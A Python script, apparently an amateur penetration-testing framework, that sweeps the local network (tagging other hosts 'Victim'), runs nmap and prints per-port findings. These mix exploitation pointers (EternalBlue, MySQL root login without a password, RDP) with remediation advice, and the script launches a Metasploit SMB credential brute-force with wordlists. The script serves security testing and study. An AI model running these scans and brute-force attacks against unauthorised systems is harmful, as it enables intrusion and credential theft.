import pyfiglet
from colorama import init, Fore, Style
import shutil

# تفعيل دعم الألوان
init()

# --- إعدادات النص والألوان ---
FONT_STYLE = "slant" 
RED_COLOR = Fore.RED      # لون "THE" والخط العلوي
BLUE_COLOR = Fore.BLUE    # لون "POWER" والخط السفلي
WHITE_COLOR = Fore.WHITE  # لون محايد للمسافات

# 1. توليد النص "THE" و "POWER"
ascii_the = pyfiglet.figlet_format("THE", font=FONT_STYLE)
the_lines = [RED_COLOR + line.rstrip() + Style.RESET_ALL for line in ascii_the.split('\n')]

ascii_power = pyfiglet.figlet_format("POWER", font=FONT_STYLE)
power_lines = [BLUE_COLOR + line.lstrip() + Style.RESET_ALL for line in ascii_power.split('\n')]

# 2. دمج الكلمات
final_banner_lines = []
max_height = max(len(the_lines), len(power_lines))

# موازنة ارتفاع الكلمات
while len(the_lines) < max_height:
    the_lines.append("")
while len(power_lines) < max_height:
    power_lines.append("")

# الفاصل الآن هو مسافة بيضاء بسيطة
SEPARATOR_SPACE = "   " 

for i in range(max_height):
    the_part = the_lines[i]
    power_part = power_lines[i]
    
    # دمج الكلمتين في سطر واحد
    combined_line = f"{the_part.rstrip()}{SEPARATOR_SPACE}{power_part.lstrip()}"
    final_banner_lines.append(combined_line)

# حساب عرض الشعار المدمج للتوسيط
try:
    terminal_width = shutil.get_terminal_size().columns
except:
    terminal_width = 80

# 3. طباعة الشعار النهائي
print("\n")

# الخط الفاصل العلوي باللون الأحمر
TOP_FRAME = RED_COLOR + "═" * 60 + Style.RESET_ALL
print(TOP_FRAME.center(terminal_width))

for line in final_banner_lines:
    print(line.center(terminal_width))

# الخط الفاصل السفلي باللون الأزرق
BOTTOM_FRAME = BLUE_COLOR + "═" * 60 + Style.RESET_ALL
print(BOTTOM_FRAME.center(terminal_width))

# print("\n")










banner = """
+────────────────────────────────────────────────────────────────────────────────────────────────────────────+
|                                         CUSTOM FRAMEWORK by SHAMS SAMARA                                   |
+────────────────────────────────────────────────────────────────────────────────────────────────────────────+|
|                                                                                                             |
|   EXPLOIT (BOW)                                      PAYLOAD (ARROW)                                        |
|        \033[93m(\033[0m                                                    _                                               |
|         \033[93m\\\033[0m                                               .-'` |\033[95m___________________________//////\033[0m             |
|          \033[93m)\033[0m                                              `'-._|                           \033[95m\\\\\\\\\\\\  \033[0m           |
|        \033[95m##-------->\033[0m                                                                                          |
|          \033[93m)\033[0m                                                                                                  |
|         \033[93m/\033[0m                                                                                                   |
|        \033[93m(\033[0m                                                                                                    |
|                                                                                                             |
+────────────────────────────────────────────────────────────────────────────────────────────────────────────+
|                                                                                                             |
|   VULNERABLE (TARGET)                           PRIVILEGE ESCALATION (SWORD)                                |
|                                                                                                             |
| \033[91m.:::::..\033[0m                                                   \033[94m/ \\\033[0m                                              |
| \033[91m.-###########-.            ..*\033[0m                            \033[94m{   }\033[0m                                             |
| \033[91m=%%%%#=:....=*%%*.         .**%-\033[0m                          \033[94mp   !\033[0m                                             |
| \033[91m.#@%%*:  .:::.   *%%:      .-++*+.\033[0m                        \033[94m; : ;\033[0m                                             |
| \033[91m.#@%#= .=%%%%%%%+. .#%:  .-+-\033[0m                             \033[94m| : |\033[0m                                             |
| \033[91m*@%%= :#%*=:.:=*%%- :%#-=-\033[0m                                \033[94m| : |\033[0m                                             |
| \033[91m=%%%+ :%%=..:-:. =%%-:+%+\033[0m                                 \033[94ml ; l\033[0m                                             |
| \033[91m*@%%: *%+ .+%%%*--+%%..%*.\033[0m                                \033[94ml ; l\033[0m                                             |
| \033[91m.*@%%. %%: =%%%%%#=.%%..*#:\033[0m                               \033[94mI ; I\033[0m                                             |
| \033[91m.*@%%. %%- -%%%@%+. %%..##:\033[0m                               \033[94mI ; I\033[0m                                             |
| \033[91m*@%%: *%* .+%%%#: +%% .%*.\033[0m                                \033[94mI ; I\033[0m                                             |
| \033[91m=%%%* .%%+  .... =%%: =%*\033[0m                                 \033[94mI ; I\033[0m                                             |
| \033[91m *@%%- .%%#=.  -#%%- .%#.\033[0m                                 \033[94md | b\033[0m                                             |
| \033[91m .#@%%-  =%%%%%%%*. .%%-\033[0m                                  \033[94mH | H\033[0m                                             |
| \033[91m  .*%%%#.. .-==. ..*@#:\033[0m                                   \033[94mH | H\033[0m                                             |
| \033[91m    +@%%%#-:::::-#%%*\033[0m                                     \033[94mH I H\033[0m                                             |
| \033[91m    :%#***%@%%#***%#-\033[0m                               ,;,   \033[94mH I H\033[0m   ,;,                                       |
| \033[91m    *#+  :#%*-:.  *#*.\033[0m                             ;H@H;  \033[94m;_H_;,\033[0m ;H@H;                                      |
| \033[91m   =#*:  :%#-     :%*=\033[0m                           `\Y/d_,;|4H@HK|;,_b\Y/'                                    |
| \033[91m  :#*=   =%+:      =%*-\033[0m                           '\;MMMMM$@@@$MMMMM;/'                                     |
| \033[91m  ***.  .%#=        ##+.\033[0m                           "~~~*;!8@8!;*~~~"                                        |
| \033[91m =#*:   :%*=        .%*=\033[0m                                  ;888;                                             |
| \033[91m.**+    +%+:         +%+.\033[0m                                 ;888;                                             |
| \033[91m+#*.    *#=          .#*=\033[0m                                 ;888;                                             |
| \033[91m.++-                   -*=:\033[0m                               ;888;                                             |
| \033[91m ..\033[0m                                                       d8@8b                                             |
|                                                           O8@8O                                             |
|                                                           T808T                                             |
|                                                            `~`                                                             


                                               |
                                               |
                                               |
                                               |
                                               |
                                               | ATTACK
                                               |
                                               |
                                               |
                                               V






    (   .     .  .=##                      ]-I-I-I-[                    /
  .=##   .  (      ( .                     \ `  ' /        \\' ,      / //
    ( .   .=##  .       .                   |'  []          \\//    _/ //' 
  .     .   ( .    .        _----|          |.  '|           \_-//' /  //<' 
                             ----|_----|    | ' .|             \ ///  <//' 
    _ _ _ _ _ _      _----|      | ----|    | [] |             /  >>   \\` 
    ]-I-I-I-I-[       ----|      |     |    |. ` |            /,)-^>>  _\` 
     \ `   '_/            |     / \    |    | /^\|            (/   \\ / \\ 
      []  `__|            ^    / ^ \   ^    | |*||                  //  //\\ 
      |__   ,|           / \  / ^ ^`\ / \   | ===|                 ((` 
   ___| ___ ,|__        / ^  /=_=_=_=\ ^ \  |, `_| 
   I_I__I_I__I_I       (====(_________)_^___|____|____ 
   \-\--|-|--/-/       |     I  [ ]__I I_I__|____I_I_| 
    |[] `    '|__   _  |_   _|`__  ._[  _-\--|-|--/-/ 
   / \  [] ` .|  |-| |-| |-| |_| |_| |_| | []   [] | 
  <===>    `  |.            .      .     |    '    | 
  ] []|  `    |   []    --   []      `   |   [] '  | 
  <===>.  `   |  .   '  .       '  .[]   | '       | 
   \_/    .   |       .       '          |   `  [] | 
    | []    . |   .  .           ,  .    | ,    .  | 
    |    . '  |       . []  '            |    []'  | 
   / \   ..   |  `      .    .     `[]   | -   `   | 
  <===>      .|=-=-=-=-=-=-=-=-=-=-=-=-=-|    .   / \ 
  ] []|` ` [] |`  .  .   _________   .   |-      <===> 
  <===>  `  ' | '   |||  |       |  |||  |  []   <===> 
   \_/     -- |   . |||  |       |  |||  | .  '   \_/ 
  ./|' . . . .|. . .||||/|_______|\|||| /|. . . . .|\_  |
+────────────────────────────────────────────────────────────────────────────────────────────────────────────+
"""
print(banner)
































# banner = r"""
# +────────────────────────────────────────────────────────────────────────────────────────────────────────────+
# |                                         CUSTOM FRAMEWORK by SHAMS SAMARA                                    |
# +────────────────────────────────────────────────────────────────────────────────────────────────────────────+|
# |                                                                                                             |
# |   EXPLOIT (BOW)                                      PAYLOAD (ARROW)                                        |
# |        (                                                    _                                               |
# |         \                                               .-'` |___________________________//////             |
# |          )                                              `'-._|                           \\\\\\             |
# |        ##-------->                                                                                          |
# |          )                                                                                                  |
# |         /                                                                                                   |
# |        (                                                                                                    |
# |                                                                                                             |
# +────────────────────────────────────────────────────────────────────────────────────────────────────────────+
# |                                                                                                             |
# |   VULNERABLE (TARGET)                           PRIVILEGE ESCALATION (SWORD)                                |
# |                                                                                                             |
# | .:::::..                                                  / \                                               |
# | .-###########-.            ..*                           {   }                                              |
# | =%%%%#=:....=*%%*.         .**%-                         p   !                                              |
# |.#@%%*:  .:::.   *%%:      .-++*+.                        ; : ;                                              |
# |.#@%#= .=%%%%%%%+. .#%:  .-+-                             | : |                                              |
# |*@%%= :#%*=:.:=*%%- :%#-=-                                | : |                                              |
# |=%%%+ :%%=..:-:. =%%-:+%+                                 l ; l                                              |
# |*@%%: *%+ .+%%%*--+%%..%*.                                l ; l                                              |
# |.*@%%. %%: =%%%%%#=.%%..*#:                               I ; I                                              |
# |.*@%%. %%- -%%%@%+. %%..##:                               I ; I                                              |
# |*@%%: *%* .+%%%#: +%% .%*.                                I ; I                                              |
# |=%%%* .%%+  .... =%%: =%*                                 I ; I                                              |
# | *@%%- .%%#=.  -#%%- .%#.                                 d | b                                              |
# | .#@%%-  =%%%%%%%*. .%%-                                  H | H                                              |
# |  .*%%%#.. .-==. ..*@#:                                   H | H                                              |
# |    +@%%%#-:::::-#%%*                                     H I H                                              |
# |    :%#***%@%%#***%#-                               ,;,   H I H   ,;,                                        |
# |    *#+  :#%*-:.  *#*.                             ;H@H;  ;_H_;, ;H@H;                                       |
# |   =#*:  :%#-     :%*=                           `\Y/d_,;|4H@HK|;,_b\Y/'                                     |
# |  :#*=   =%+:      =%*-                           '\;MMMMM$@@@$MMMMM;/'                                      |
# |  ***.  .%#=        ##+.                           "~~~*;!8@8!;*~~~"                                         |
# | =#*:   :%*=        .%*=                                  ;888;                                              |
# |.**+    +%+:         +%+.                                 ;888;                                              |
# |+#*.    *#=          .#*=                                 ;888;                                              |
# |.++-                   -*=:                               ;888;                                              |
# | ..                                                       d8@8b                                              |
# |                                                          O8@8O                                              |
# |                                                          T808T                                              |
# |                                                           `~`                                               |
# +────────────────────────────────────────────────────────────────────────────────────────────────────────────+
# """
# print(banner)




























# "Created By {Fore.RED}SHAMS{Style.RESET_ALL} {Fore.CYAN}SAMARA{Style.RESET_ALL}"



# from colorama import Fore, Style
# import shutil

# terminal_width = shutil.get_terminal_size().columns

# signature_text = Fore.WHITE + Style.BRIGHT +"""
#    ____                _           _   _                                        
#   / ___|_ __ ___  __ _| |_ ___  __| | | |__  _   _                              
#  | |   | '__/ _ \/ _` | __/ _ \/ _` | | '_ \| | | |                             
#  | |___| | |  __/ (_| | ||  __/ (_| | | |_) | |_| |                             
#   \____|_|  \___|\__,_|\__\___|\__,_| |_.__/ \__, |                             
#   ____  _   _    _    __  __ ____    ____    |___/__  __    _    ____      _    
#  / ___|| | | |  / \  |  \/  / ___|  / ___|  / \  |  \/  |  / \  |  _ \    / \   
#  \___ \| |_| | / _ \ | |\/| \___ \  \___ \ / _ \ | |\/| | / _ \ | |_) |  / _ \  
#   ___) |  _  |/ ___ \| |  | |___) |  ___) / ___ \| |  | |/ ___ \|  _ <  / ___ \ 
#  |____/|_| |_/_/   \_\_|  |_|____/  |____/_/   \_\_|  |_/_/   \_\_| \_\/_/   \_                                                                                                                                                                                            
# """+ Style.RESET_ALL

# print(signature_text.center(terminal_width))

# print("\n")




















import subprocess

def get_ip_address():
    # تنفيذ أمر ifconfig مع grep لاستخراج عناوين الـ IP
    result = subprocess.run(
        "ifconfig | grep -oP 'inet\\s+\\K[0-9.]+'",
        shell=True,
        capture_output=True,
        text=True
    )

    # نخزن الـ output ونختار أول IP غير 127.0.0.1
    lines = result.stdout.strip().split('\n')
    ips = [ip for ip in lines if ip != "127.0.0.1"]

    if ips:
        return ips[0]  # أول IP حقيقي
    else:
        return None
LHOST = get_ip_address()
def ask_and_show_ip():
    answer = input("\033[92mWould you like to know your IP address? (y/n): \033[0m").strip().lower()


    if answer in ("y", "yes"):
        ip = get_ip_address()
        if ip:
            print(f"\033[93mYour IP address is:\033[0m \033[92m{ip}\033[0m")
        else:
            print("Could not detect your IP address.")
    else:
        print("Okay, not showing the IP address.")

if __name__ == "__main__":
    ask_and_show_ip()



# import subprocess

# # Colors
# GREEN = "\033[92m"
# YELLOW = "\033[93m"
# CYAN = "\033[96m"
# RESET = "\033[0m"

# MY_IP = get_ip_address() 

# def get_devices():
#     result = subprocess.run(
#         "fping -a -g 192.168.1.0/24 2>/dev/null",
#         shell=True,
#         capture_output=True,
#         text=True
#     )
#     devices = result.stdout.strip().split('\n')
#     return [d for d in devices if d]

# def ask_and_show_devices():
#     answer = input("\033[95mWould you like to know the devices on your network? (y/n): \033[0m").strip().lower()

#     if answer in ("y", "yes"):
#         devices = get_devices()
#         if devices:
#             print(f"{CYAN}Devices found on your network:{RESET}")
#             for d in devices:
#                 if d == MY_IP:
#                     print(f"{GREEN}- {d}  (Your device){RESET}")
#                 else:
#                     print(f"{YELLOW}- {d}  (Victim){RESET}")
#         else:
#             print("No devices detected.")
#     else:
#         print("Okay, not scanning the network.")

# if __name__ == "__main__":
#     ask_and_show_devices()






import subprocess
import psutil  # للحصول على IPs لكل واجهة

# Colors
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def get_all_my_ips():
    ip_dict = {}
    addrs = psutil.net_if_addrs()
    for iface, snics in addrs.items():
        for snic in snics:
            if snic.family.name == "AF_INET":  # IPv4 فقط
                ip_dict[snic.address] = iface
    return ip_dict

def select_my_ip(ip_dict):
    print(f"{CYAN}Your device has these IPs:{RESET}")
    for i, (ip, iface) in enumerate(ip_dict.items(), 1):
        print(f"{i}. {ip} ({iface})")

    choice = input("\033[95mChoose the IP (number or IP address): \033[0m").strip()

    # إذا أدخل IP مباشرة
    if choice in ip_dict:
        print(f"{GREEN}You selected {choice} on interface {ip_dict[choice]}{RESET}\n")
        return choice, ip_dict[choice]

    # إذا أدخل رقم
    try:
        choice = int(choice)
        if 1 <= choice <= len(ip_dict):
            selected_ip = list(ip_dict.keys())[choice - 1]
            print(f"{GREEN}You selected {selected_ip} on interface {ip_dict[selected_ip]}{RESET}\n")
            return selected_ip, ip_dict[selected_ip]
    except:
        pass

    print(f"{YELLOW}Invalid choice, using first IP by default.{RESET}")
    first_ip = list(ip_dict.keys())[0]
    return first_ip, ip_dict[first_ip]

def get_devices(network_prefix):
    result = subprocess.run(
        f"fping -a -g {network_prefix}.0/24 2>/dev/null",
        shell=True,
        capture_output=True,
        text=True
    )
    devices = result.stdout.strip().split('\n')
    return [d for d in devices if d]

def ask_and_show_devices(selected_ip):
    network_prefix = ".".join(selected_ip.split(".")[:3])
    answer = input("\033[95mDo you want to scan devices on this network? (y/n): \033[0m").strip().lower()
    if answer in ("y", "yes"):
        devices = get_devices(network_prefix)
        if devices:
            print(f"{CYAN}Devices found on your network:{RESET}")
            for d in devices:
                if d == selected_ip:
                    print(f"{GREEN}- {d}  (Your device){RESET}")
                else:
                    print(f"{YELLOW}- {d}  (Victim){RESET}")
        else:
            print("No devices detected.")
    else:
        print("Okay, not scanning the network.")

if __name__ == "__main__":
    ip_dict = get_all_my_ips()
    selected_ip, iface = select_my_ip(ip_dict)
    ask_and_show_devices(selected_ip)













import subprocess
import shutil







# Target IP
target = input("\033[96mEnter your IP to scan: \033[0m")
print(f"You entered: {target}")

TARGET_IP = target













# ===================== CHECK IF HOST IS UP =====================
def host_up_warning(ip):
    print("\n\033[96m[*] Checking if the host is up via ping...\033[0m")
    import subprocess
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "2", ip],
            capture_output=True,
            text=True
        )
        if result.returncode != 0:
            print(f"\033[91m[-] Host {ip} did not respond to ping.\033[0m")
            print("\033[93m[!] Suggestion: You may want to use the Nmap '-Pn' option to skip host discovery.\033[0m\n")
        else:
            print(f"\033[92m[+] Host {ip} is up and responding.\033[0m\n")
    except Exception as e:
        print(f"\033[91m[!] Ping check failed: {e}\033[0m\n")

host_up_warning(TARGET_IP)
# ================================================================














# ================== SCAN CUSTOMIZATION ==================

print("""
Select scan type:
1) Stealth Scan (Low noise)
2) Deep Scan (Balanced)
3) Aggressive Scan (Loud)
""")

scan_choice = input("Enter choice (1/2/3): ").strip()

if scan_choice == "1":
    SCAN_ARGS = ["-sS", "-T2", "--max-retries", "2"]
elif scan_choice == "2":
    SCAN_ARGS = ["-sS", "-sV", "-O", "-T4"]
elif scan_choice == "3":
    SCAN_ARGS = ["-A", "-sV", "-O", "-sC", "-T5"]
else:
    SCAN_ARGS = ["-sS", "-sV", "-O", "-T4"]

print("""
Select ports:
1) Common ports
2) All ports
3) Custom ports
""")

port_choice = input("Enter choice (1/2/3): ").strip()

if port_choice == "1":
    PORTS = "21,22,23,25,53,80,110,139,143,443,445,3306,3389"
elif port_choice == "2":
    PORTS = "1-65535"
elif port_choice == "3":
    PORTS = input("Enter ports (e.g. 80,443,8080): ").strip()
else:
    PORTS = "80,443"

# ========================================================














nmap_output = ""  # افتراضياً فارغة

# def is_port_open(port):
#     return f"{port}/tcp open" in nmap_output


def is_port_open(port):
    for line in nmap_output.splitlines():
        if line.startswith(f"{port}/tcp") and "open" in line:
            return True
    return False




nmap_xml = "scan.xml"
# Check if nmap is installed
if shutil.which("nmap") is None:
    print("❌ nmap is not installed. Please run: sudo apt install nmap")
else:
    try:
        print(f"🚀 Starting scan on: {target}\n")

        # Run nmap with proper arguments
        # result = subprocess.run([
        #     "nmap",
        #     "-A",
        #     "-sV",
        #     "--version-intensity", "9",
        #     "-O",
        #     "--osscan-guess",
        #     "-sC",
        #     "-T5",
        #     "-vv",
        #     "-p", "21,445,3306,3389,80",
        #      "-oX",nmap_xml,
        #     target
        # ], capture_output=True, text=True, timeout=300)
        result = subprocess.run([
    "nmap",
    *SCAN_ARGS,
    "-vv",
    "-p", PORTS,
    "-oX", nmap_xml,
    TARGET_IP
], capture_output=True, text=True, timeout=600)

        # Print the full output exactly like nmap
        print(result.stdout)
        nmap_output = result.stdout

       

    



        

    except subprocess.TimeoutExpired:
        print("⏱️ Scan exceeded the allotted time.")
    except Exception as e:
        print(f"⚠️ Error running nmap: {e}")



import xml.etree.ElementTree as ET

def parse_nmap_os(xml_file):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    ports_info = {}
    os_detected = None

    # محاولة الحصول على أفضل OS
    os_match = root.find("host/os/osmatch")
    if os_match is not None:
        os_detected = os_match.attrib.get("name")

    # لكل منفذ
    for port in root.findall("host/ports/port"):
        portid = port.attrib.get("portid")
        service_elem = port.find("service")
        service_name = service_elem.attrib.get("name") if service_elem is not None else "unknown"

        ports_info[portid] = {
            "service": service_name,
            "os": os_detected  # يمكن تخصيص لكل منفذ إذا وجد OS لكل service
        }
    return ports_info









services = parse_nmap_os(nmap_xml)





import os
import xml.etree.ElementTree as ET

services = {}

tree = ET.parse("scan.xml")
root = tree.getroot()

# استخراج نظام التشغيل
os_name = "Unknown"
os_elem = root.find(".//osmatch")
if os_elem is not None:
    os_name = os_elem.attrib.get("name", "Unknown")

for port in root.findall(".//port"):
    portid = port.attrib["portid"]
    state = port.find("state").attrib["state"]

    if state != "open":
        continue

    service_elem = port.find("service")
    service_name = service_elem.attrib.get("name", "unknown")
    product = service_elem.attrib.get("product", "")
    version = service_elem.attrib.get("version", "")
    extrainfo = service_elem.attrib.get("extrainfo", "")

    full_version = " ".join(filter(None, [product, version, extrainfo]))

    services[portid] = {
        "service": service_name,
        "version": full_version if full_version else "Unknown",
        "os": os_name
    }



if is_port_open(21):
 if "21" in services:
  
  info = services["21"]        
  print("\033[92m[*]\033\033[92mFTP\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt is possible to exploit it:\nWARNING This service is an outdated version and can be exploited in the following ways:\nthat allows unrestricted brute-force attacks\033[0m⚡️⚡️")
  print()
  print("🛡️🛡️  \033[94mPenetration Testing Report – FTP Service Exposure (Port 21)\n"
      "Finding ID: PT-FTP-001\n"
      "Severity: High\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      f"Port: 21/TCP (Open)\033[0m\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution FTP: Update or remove the service if you no longer need it.\n\n"
      "Disable FTP entirely if not required, or replace it with SFTP/FTPS.\n\n"
      "Block port 21 on the firewall except for authorized internal IPs.\n\n"
      "Disable anonymous login and enforce strong authentication.\n\n"
      "Enable logging and harden FTP settings through IIS or the FTP service configuration.\033[0m")





if is_port_open(445):
 if "445" in services:
  info = services["445"]
  print("\033[92m[*]\033\033[92mSMB\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt how to exploit:You can exploit it using a known vulnerability in this service called EternalBlueexploit in msfconsole is:exploit/windows/smb/ms17_010_eternalblue \033[0m⚡️⚡️")
  print()
  print("\033[93mnote: you can execute a brute force attack in smb_login\n"
      "use this module: auxiliary/scanner/smb/smb_login\033[0m")
  print()
  print("🛡️🛡️  \033[94mPenetration Testing Report – SMB Service Exposure (Port 445)\n"
      "Finding ID: PT-SMB-002\n"
      "Severity: Critical\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      "Port: 445/TCP (Open)\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution: Upgrade or replace Windows Server 2008 R2 (End-of-life) with a supported version.\n\n"
      "Disable SMBv1 and restrict port 445 to internal trusted IPs only.\n\n"
      "Enable SMB Signing and disable guest/anonymous access.\n\n"
      "Implement firewall rules and monitor SMB logs for suspicious activity.\033[0m")






if is_port_open(3306):
 if "3306" in services:
  info = services["3306"]
  print("\033[92m[*]\033\033[92mMYSQL\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt how to exploit: You can exploit login in root username No password\n\n"
      "Brute Force login\n\n"
      "Enumerate users\n\n"
      "Exploiting vulnerabilities\n\n"
      "Dumping databases\n\n"
      "add & delete database\033[0m⚡️⚡️")
  print()

  print("🛡️🛡️  \033[94mPenetration Testing Report – MySQL Service Exposure (Port 3306)\n"
      "Finding ID: PT-MYSQL-003\n"
      "Severity: High\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      "Port: 3306/TCP (Open)\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution: Upgrade MySQL from the outdated 5.5.20 version to a supported version such as MySQL 8.0.\n\n"
      "Restrict port 3306 using a firewall so it’s only accessible from localhost or specific trusted IPs.\n\n"
      "Enforce strong passwords and disable remote root login.\n\n"
      "Enable logging and remove any unnecessary accounts or privileges.\033[0m")














if is_port_open(3389):
 if "3389" in services:
  info = services["3389"] 
  print("\033[92m[*]\033\033[92mRDP\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt you can exploit it: rdesktop -u ***** -p ***** <Target>""\033[0m⚡️⚡️")
  print()

  print("🛡️🛡️  \033[94mPenetration Testing Report – RDP Service Exposure (Port 3389)\n"
      "Finding ID: PT-RDP-004\n"
      "Severity: High\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      "Port: 3389/TCP (Open)\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution: Restrict RDP access using a firewall so only specific trusted IPs can connect.\n\n"
      "Enable Network Level Authentication (NLA) and enforce strong passwords + account lockout policies.\n\n"
      "Update the OS (Windows 7/2008 R2/Vista) to a supported version due to known RDP vulnerabilities.\n\n"
      "Enable RDP encryption, disable weak ciphers, and consider enabling 2FA for remote access.\033[0m")







if is_port_open(80):
 if "80" in services:
  
  info = services["80"]        
  print("\033[92m[*]\033\033[92mHTTP\033[0m")
  print("⚡️⚡️\033[92m[*]\033[0m\033[91mIt this is the best Position to information gathering:\nWARNING This service is an outdated version and can be exploited in the following ways:\033[0m⚡️⚡️")
  print()
  print("🛡️🛡️  \033[94mPenetration Testing Report – HTTP Service Exposure (Port 80)\n"
      "Finding ID: PT-HTTP-005\n"
      "Severity: High\n"
      "Date: 2025\n"
      f"Target: {TARGET_IP}\n"
      f"Service: {info['service']}\n"
      f"Version: {info['version']}\n"
      f"Port: 80/TCP (Open)\033[0m\n"f"OS Detected: {info['os']} ""\033[0m🛡️🛡️")
  print()

  print("\033[92msolution HTTP: Update or remove the service if you no longer need it.\n\n"
      "Disable HTTP entirely if not required, or replace it with https for secure information such as login page.\033[0m")












known_ports = ["21", "445", "3306", "3389", "80"]










for port, info in services.items():
    if port not in known_ports:
        print("\n🛡️🛡️  \033[94mPenetration Testing Report – Generic Service Exposure\033[0m")
        print(
            f"Finding ID: PT-GEN-{port}\n"
            "Severity: Medium\n"
            "Date: 2025\n"
            f"Target: {TARGET_IP}\n"
            f"Service: {info['service']}\n"
            f"Version: {info['version']}\n"
            f"Port: {port}/TCP (Open)\n"
            f"OS Detected: {info['os']}\n"
        )

        print(
            "\033[92mRecommendation:\n"
            "- Review the necessity of this service.\n"
            "- Restrict access using firewall rules.\n"
            "- Update the service to the latest supported version.\n"
            "- Monitor logs for suspicious activity.\033[0m"
        )












# import subprocess
# import tempfile

# choice = input("\n\033[93mDo you want to run SMB brute-force attack using Metasploit? (yes/no): \033[0m").strip().lower()

# if choice == "yes" or "y":
#     print("\n\033[91m[!] Launching Metasploit... executing SMB brute-force module...\033[0m\n")

    
#     msf_script = f"""
# setg LHOST {LHOST}
# setg RHOSTS {TARGET_IP}
# use auxiliary/scanner/smb/smb_login
# set user_file /home/shams/Desktop/project/users.txt
# set pass_file /home/shams/Desktop/project/password.txt
# set stop_on_success true
# set verbose true
# run
# exit
# """

#     with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False) as f:
#         f.write(msf_script)
#         script_path = f.name

   
#     #subprocess.run(["msfconsole", "-q", "-r", script_path])
#     result = subprocess.run(
#     ["msfconsole", "-q", "-r", script_path],
#     capture_output=True,
#     text=True
# )
# import re

# full_output = result.stdout + result.stderr
# FOUND_CREDS = None

# for line in full_output.splitlines():
#     if "Success:" in line:
#         FOUND_CREDS = line
#         break

# if FOUND_CREDS:
#     print("\033[92m[+] Successful credentials found!\033[0m")
#     print(f"\033[94m[*] Raw Line:\033[0m {FOUND_CREDS}")

#     match = re.search(r"Success:\s+'([^:]+):([^']+)'", FOUND_CREDS)
#     if match:
#         USERNAME = match.group(1)
#         PASSWORD = match.group(2)


#         USERNAME= USERNAME.split("\\")[-1]

#         print(f"\033[93mUsername:\033[0m {USERNAME}")
#         print(f"\033[93mPassword:\033[0m {PASSWORD}")
#     else:
#      print("\033[91m[-] No valid credentials found.\033[0m")


# else:
#     print("\n\033[92m[*] SMB brute-force attack skipped.\033[0m")











def smb_conditions_met():
    return is_port_open(445) and "445" in services and services["445"]["service"] in ["smb", "microsoft-ds"]

def mysql_conditions_met():
    return is_port_open(3306) and "3306" in services and services["3306"]["service"] == "mysql"





#SMB


if smb_conditions_met():
    choice = input(
        "\033[93m[?] SMB service detected.\n"
        "Do you want to continue with SMB testing? (y/n): \033[0m"
    ).strip().lower()

    if choice in ["y", "yes"]:
        print("\033[92m[*] SMB testing authorized by user.\033[0m")
        # هنا فقط يتم استدعاء كود SMB (إن وجد)
    else:
        print("\033[91m[*] SMB testing skipped by user.\033[0m")
else:
    print("\033[94m[-] SMB conditions not met. Skipping SMB module.\033[0m")












#MySQL


if mysql_conditions_met():
    choice = input(
        "\033[93m[?] MySQL service detected.\n"
        "Do you want to continue with MySQL testing? (y/n): \033[0m"
    ).strip().lower()

    if choice in ["y", "yes"]:
        print("\033[92m[*] MySQL testing authorized by user.\033[0m")
        # هنا فقط يتم استدعاء كود MySQL
    else:
        print("\033[91m[*] MySQL testing skipped by user.\033[0m")
else:
    print("\033[94m[-] MySQL conditions not met. Skipping MySQL module.\033[0m")




















#Brute Force SMB

import os

def smb_bruteforce_conditions_met():
    if not is_port_open(445):
        return False, "Port 445 is not open"

    if "445" not in services:
        return False, "SMB service not detected"

    if services["445"]["service"] not in ["microsoft-ds", "netbios-ssn", "smb", "cifs"]:
        return False, "Service is not SMB"


    if "Windows" not in services["445"]["os"]:
        return False, "Target OS is not Windows"

    return True, "Conditions met"





can_run, reason = smb_bruteforce_conditions_met()












can_run, reason = smb_bruteforce_conditions_met()

if not can_run:
    print(f"\033[94m[-] SMB brute-force skipped: {reason}\033[0m")

else:
    choice = input(
        "\n\033[93m[?] SMB conditions met.\n"
        "Do you want to run SMB brute-force attack using Metasploit? (y/n): \033[0m"
    ).strip().lower()

    if choice in ["yes", "y"]:
        print("\n\033[91m[!] Launching Metasploit... executing SMB brute-force module...\033[0m\n")
        # 👇 كود Metasploit كامل كما هو
    else:
        print("\033[92m[*] SMB brute-force skipped by user.\033[0m")





















#RDP
def rdp_conditions_met():
    if not is_port_open(3389):
        return False, "Port 3389 is not open"

    if "3389" not in services:
        return False, "RDP service not detected"

    if services["3389"]["service"] not in ["ms-wbt-server", "rdp", "ssl/ms-wbt-server"]:
        return False, "Service is not RDP"

    if "Windows" not in services["3389"]["os"]:
        return False, "Target OS is not Windows"

    return True, "Conditions met"


















can_run, reason = smb_bruteforce_conditions_met()

import subprocess
import tempfile
import re
if not can_run:
    print(f"\033[94m[-] SMB brute-force skipped: {reason}\033[0m")
else:    
 # الملفات الافتراضية
 default_user_file = "/home/shams/Desktop/project/users.txt"
 default_pass_file = "/home/shams/Desktop/project/password.txt"

 choice = input("\n\033[93mDo you want to run SMB brute-force attack using Metasploit? (yes/no): \033[0m").strip().lower()

 if choice in ["yes", "y"]:
    print("\n\033[91m[!] Launching Metasploit... executing SMB brute-force module...\033[0m\n")
    
    # نسأل المستخدم عن مسار الملفات مع افتراضيات
    user_file = input(f"\033[93mEnter the full path to the users file [{default_user_file}]: \033[0m").strip()
